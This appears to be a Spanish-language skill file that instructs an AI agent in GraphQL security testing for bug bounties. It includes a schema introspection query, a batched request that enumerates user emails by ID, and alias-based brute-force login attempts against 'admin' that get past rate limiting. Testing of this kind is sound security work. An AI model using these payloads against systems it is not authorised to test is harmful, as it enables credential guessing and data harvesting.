---
name: bug-bounty-graphql
description: Detección y explotación de vulnerabilidades en APIs GraphQL. Introspección, BOLA/IDOR en mutaciones, bypassing de Rate Limiting via Query Batching & Aliases y CSRF en GraphQL.
---

# Skill: GraphQL Security Assessment & Exploitation

Esta habilidad capacita al agente para evaluar la seguridad de endpoints GraphQL (típicamente en `/graphql`, `/v1/graphql`, `/api/graphql`), abusar de esquemas de introspección desprotegidos y ejecutar ataques de fuerza bruta u Omisión de Autorización.

## 📌 Vectores de Auditoría GraphQL

### 1. Consultas de Introspección (Schema Leakage)
- Verificar si la introspección está habilitada:
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

### 2. Bypass de Rate Limiting mediante Aliases y Batching
- **Query Batching**: Enviar un arreglo de objetos JSON en una sola solicitud HTTP POST:
`[{"query": "{ user(id: 1) { email } }"}, {"query": "{ user(id: 2) { email } }"}]`
- **GraphQL Aliases**:
```graphql
query {
  req1: login(username: "admin", password: "123") { token }
  req2: login(username: "admin", password: "456") { token }
}
```

---

## 📚 Documentación de Ataques GraphQL

Consulta la lista de vectores y reportes destacados en:
[graphql-attack-vectors.md](file:///C:/Users/logir/.gemini/antigravity-ide/scratch/bug-bounty-skills/skills/bug-bounty-graphql/references/graphql-attack-vectors.md)
